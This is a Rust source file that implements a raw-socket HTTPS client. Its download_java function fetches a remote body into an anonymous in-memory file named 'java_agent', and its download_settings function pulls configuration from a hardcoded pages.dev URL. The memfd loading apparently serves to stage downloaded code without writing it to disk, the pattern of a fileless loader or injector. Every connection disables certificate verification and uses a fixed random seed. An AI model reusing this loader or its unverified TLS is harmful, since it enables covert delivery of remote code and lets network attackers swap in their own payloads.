struct RustixTCP {}
use core::{
    future::Future,
    net::{Ipv4Addr, SocketAddrV4},
    str,
};

use alloc::{string::ToString, vec::Vec};
use embedded_io_async::ErrorType;
use embedded_nal_async::{SocketAddr, TcpConnect};
use reqwless::{
    client::{TlsConfig, TlsVerify},
    request::{Method, RequestBuilder},
};
use rustix::{
    fd::{FromRawFd, IntoRawFd, OwnedFd},
    fs::MemfdFlags,
    io::Errno,
    net::{ipproto, AddressFamily, RecvFlags, SendFlags, SocketType},
};

use crate::{dns::DnsClient, println, settings::RemoteSettings};

#[derive(thiserror::Error, Debug)]
pub enum RustixTCPError {
    #[error("Errno {0}")]
    Errno(Errno),

    #[error("invalid address")]
    InvalidAddress,

    #[error("unknown error")]
    Unknown,
}

impl embedded_io_async::Error for RustixTCPError {
    fn kind(&self) -> embedded_io_async::ErrorKind {
        //todo!()
        embedded_io_async::ErrorKind::AlreadyExists
    }
}

pub struct RustixTcpConnection<'a> {
    socket: OwnedFd,
    phantom: core::marker::PhantomData<&'a ()>,
}

impl ErrorType for RustixTcpConnection<'_> {
    type Error = RustixTCPError;
}

impl embedded_io_async::Read for RustixTcpConnection<'_> {
    async fn read(&mut self, buf: &mut [u8]) -> Result<usize, Self::Error> {
        let res =
            rustix::net::recv(&self.socket, buf, RecvFlags::empty()).map_err(RustixTCPError::Errno);

        // println!("Read {:?} bytes", res);
        res
    }
}

impl embedded_io_async::Write for RustixTcpConnection<'_> {
    async fn write(&mut self, buf: &[u8]) -> Result<usize, Self::Error> {
        rustix::net::send(&self.socket, buf, SendFlags::empty()).map_err(RustixTCPError::Errno)
    }

    async fn flush(&mut self) -> Result<(), Self::Error> {
        Ok(())
    }
}

impl TcpConnect for RustixTCP {
    type Error = RustixTCPError;

    type Connection<'a> = RustixTcpConnection<'a>;

    async fn connect<'a>(&'a self, remote: SocketAddr) -> Result<Self::Connection<'a>, Self::Error>
    where
        Self: 'a,
    {
        let socket =
            rustix::net::socket(AddressFamily::INET, SocketType::STREAM, Some(ipproto::TCP))
                .map_err(RustixTCPError::Errno)?;
        let remote_ip = match remote {
            SocketAddr::V4(addr) => addr.ip().octets(),
            _ => return Err(RustixTCPError::InvalidAddress),
        };

        let ip = Ipv4Addr::new(remote_ip[0], remote_ip[1], remote_ip[2], remote_ip[3]);

        let addr = SocketAddrV4::new(ip, remote.port());
        rustix::net::connect_v4(&socket, &addr).map_err(RustixTCPError::Errno)?;

        Ok(RustixTcpConnection {
            socket,
            phantom: core::marker::PhantomData,
        })
    }
}

struct HttpConfig {
    tcp_client: RustixTCP,
    dns_client: DnsClient,
    tls_read_buffer: Vec<u8>,
    tls_write_buffer: Vec<u8>,
}

impl HttpConfig {
    fn new() -> Self {
        Self::new_with_buf_size(8 * 1024 * 1024)
    }
    fn new_with_buf_size(size: usize) -> Self {
        let seed = 6; //TODO: very secure

        let tcp_client = RustixTCP {};
        let dns_client = DnsClient::new_ipv4([8, 8, 8, 8], 53);

        let tls_read_buffer = vec![0u8; size];
        let tls_write_buffer = vec![0u8; size];

        Self {
            tcp_client,
            dns_client,
            tls_read_buffer,
            tls_write_buffer,
        }
    }
}

#[derive(thiserror::Error, Debug)]
pub enum HttpError {
    #[error("Redirect location missing")]
    RedirectLocationMissing,

    #[error("Reqwless error")]
    Reqwless(reqwless::Error),

    #[error("Deserialization error {0}")]
    Deserialization(serde_json::Error),

    #[error("Errno {0}")]
    Errno(Errno),
}

async fn follow_url(url: &str) -> Result<alloc::string::String, HttpError> {
    let mut cfg = HttpConfig::new();
    let seed = 6; //TODO: very secure
    let tls = TlsConfig::new(
        seed,
        &mut cfg.tls_read_buffer,
        &mut cfg.tls_write_buffer,
        TlsVerify::None,
    );
    let mut client =
        reqwless::client::HttpClient::new_with_tls(&cfg.tcp_client, &cfg.dns_client, tls);

    let mut rx_buf = vec![0; 16000];

    let mut req = client.request(Method::GET, url).await.unwrap();

    let res = req.send(&mut rx_buf).await.unwrap();
    for (k, v) in res.headers() {
        if k.to_lowercase() == "location" {
            let location = alloc::string::String::from_utf8_lossy(v);
            return Ok(location.to_string());
        }
    }

    Err(HttpError::RedirectLocationMissing)
}

static MEM_FD_NO: core::sync::atomic::AtomicI32 = core::sync::atomic::AtomicI32::new(0);

pub fn download_java(url: &str) -> Result<Option<OwnedFd>, HttpError> {
    MEM_FD_NO.store(0, core::sync::atomic::Ordering::SeqCst);
    let url = url.to_string();
    let executor = pasts::Executor::default();

    executor.block_on(async move {
        let url = follow_url(url.as_str()).await.unwrap();
        println!("Redirected to: {:?}", url);

        // ----
        let mut cfg = HttpConfig::new();
        let seed = 6; //TODO: very secure
        let tls = TlsConfig::new(
            seed,
            &mut cfg.tls_read_buffer,
            &mut cfg.tls_write_buffer,
            TlsVerify::None,
        );
        let mut client =
            reqwless::client::HttpClient::new_with_tls(&cfg.tcp_client, &cfg.dns_client, tls);

        let mut rx_buf = vec![0; 8_096]; // this is too hack

        // ----

        let mut req = client.request(Method::GET, &url).await.unwrap();

        let res = req.send(&mut rx_buf).await.unwrap();

        let size = res.content_length.unwrap_or(100_000_000) + 100;
        let mut buf = vec![0; size];

        let mut reader = res.body().reader();
        let total_read = reader
            .read_to_end(&mut buf)
            .await
            .map_err(HttpError::Reqwless)
            .unwrap();

        let memfd = write_to_memfd(&buf[0..total_read]).unwrap();
        let fd = memfd.into_raw_fd();

        // hack
        MEM_FD_NO.store(fd, core::sync::atomic::Ordering::SeqCst);
    });

    let fd = MEM_FD_NO.load(core::sync::atomic::Ordering::SeqCst);
    if fd == 0 {
        Ok(None)
    } else {
        let fd = unsafe { OwnedFd::from_raw_fd(fd) };
        Ok(Some(fd))
    }
}

fn write_to_memfd(buf: &[u8]) -> Result<OwnedFd, HttpError> {
    let memfd =
        rustix::fs::memfd_create("java_agent", MemfdFlags::empty()).map_err(HttpError::Errno)?;
    let _ = rustix::io::write(&memfd, buf).map_err(HttpError::Errno)?;
    Ok(memfd)
}

async fn no_unwrap<T>(f: impl Future<Output = Result<T, HttpError>> + 'static) {
    if let Err(error) = f.await { println!("Http error: {:?}", error) }
}

pub fn download_settings() -> Result<(), HttpError> {
    let url = "https://cf-page-3uk.pages.dev/data.json".to_string();

    let executor = pasts::Executor::default();

    executor.block_on(async move {
        no_unwrap(async move {
            // ----
            let mut cfg = HttpConfig::new_with_buf_size(16 * 1024);
            let seed = 6; //TODO: very secure
            let tls = TlsConfig::new(
                seed,
                &mut cfg.tls_read_buffer,
                &mut cfg.tls_write_buffer,
                TlsVerify::None,
            );
            let mut client =
                reqwless::client::HttpClient::new_with_tls(&cfg.tcp_client, &cfg.dns_client, tls);

            let mut rx_buf = vec![0; 8_096]; // TODO: buffer handling and code reuse needs more love

            // ----

            let mut req = client
                .request(Method::GET, &url)
                .await
                .map_err(HttpError::Reqwless)?;
            let response = req.send(&mut rx_buf).await.map_err(HttpError::Reqwless)?;

            let r = response
                .body()
                .read_to_end()
                .await
                .map_err(HttpError::Reqwless)?;

            let r = alloc::string::String::from_utf8_lossy(r);

            let settings: RemoteSettings = serde_json::from_str(&r).map_err(HttpError::Deserialization)?;

            settings.store();

            Ok(())
        })
        .await;
    });
    Ok(())
}
